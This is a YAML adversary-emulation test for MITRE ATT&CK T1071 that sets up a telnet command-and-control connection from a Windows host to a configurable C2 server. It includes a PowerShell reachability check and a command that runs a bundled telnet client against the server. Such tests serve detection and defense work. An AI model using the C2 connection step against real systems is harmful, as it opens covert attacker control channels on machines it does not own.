attack_technique: T1071
display_name: 'Application Layer Protocol'
atomic_tests:
- name: Telnet C2
  auto_generated_guid: 3b0df731-030c-4768-b492-2a3216d90e53
  description: |
    Establish telnet connection from compromised machine to C2 server
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      C2 Server must be reachable
    prereq_command: |
      $connection = Test-NetConnection -ComputerName #{server_ip} -Port #{server_port}

      if ($connection.TcpTestSucceeded) {
          Write-Output "#{server_ip} Port #{server_port} is reachable."
          exit 0
      } else {
          Write-Output "#{server_ip} Port #{server_port} is unreachable."
          exit 1
      }

    get_prereq_command: |
      Write-Host "Setup C2 server manually"
  input_arguments:
    server_ip:
      description: C2 server IP or URL
      type: url
      default: localhost  # Replace "example.com" with the actual IP or URL
    client_path:
      description: Client agent path
      type: url
      default: PathToAtomicsFolder\T1071\src\telnet_client.exe  # Update the path if needed
    server_port:
      description: C2 server port
      type: Integer
      default: 23
  executor:
    command: |
      .\#{client_path} #{server_ip} --port #{server_port}
    name: powershell
